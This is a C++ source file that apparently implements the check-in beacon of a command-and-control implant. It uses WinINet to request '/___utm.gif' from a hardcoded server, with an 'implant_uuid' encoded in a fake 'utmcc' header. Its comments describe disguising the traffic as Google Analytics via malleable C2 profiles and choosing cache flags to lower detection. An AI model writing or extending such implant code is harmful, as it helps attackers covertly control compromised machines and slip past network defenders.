#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "wininet.lib")

bool HttpGetReq(std::vector<std::wstring>& headers, std::vector<char>& response) {
    // 1. Initialize
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
    HINTERNET hInternet = InternetOpen(
        L"WinINet Example",                // user agent - template, malc2 this
        INTERNET_OPEN_TYPE_PRECONFIG,     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena#parameters: INTERNET_OPEN_TYPE_PRECONFIG: proxy OR direct, based on registry (matches inet expl)
        NULL, 
        NULL, 
        0
    );
    if (!hInternet) return false;

    // 2. Connect (Hardcoded IP and Port)
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnectw
    HINTERNET hConnect = InternetConnect(
        hInternet,
        L"10.0.0.30",           // Server - template,
        9010,                   // Port - template
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    // 3. Open Request (Hardcoded Path)
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
    HINTERNET hRequest = HttpOpenRequest(
        hConnect,
        L"GET",                 // Method - template, mallc2 this
        L"/___utm.gif",         // Path - template, mallc2 this
        NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
        0
    );
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // 4. Add Headers Loop
    for (const auto& header : headers) {
        //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpaddrequestheadersa
        //easier to put headers here rather than 2nd arg of HttpSendRequest
        HttpAddRequestHeaders(hRequest, header.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE); //HTTP_ADDREQ_FLAG_REPLACE will replace an existing header of the same name
    }

    // 5. Send Request
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        std::cerr << "Send failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // 6. Read Response
    char tempBuffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        response.insert(response.end(), tempBuffer, tempBuffer + bytesRead);
    }

    // Cleanup
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

int main() {
    std::vector<char> responseBuffer;

    // Define headers (No \r\n needed)
    std::vector<std::wstring> headers = {
        //msgpack -> b64: {"implant_uuid":"00000-00...."}
        L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
    };

    if (HttpGetReq(headers, responseBuffer)) {
        std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;
    }
    else {
        std::cerr << "Request failed." << std::endl;
    }

    return 0;
}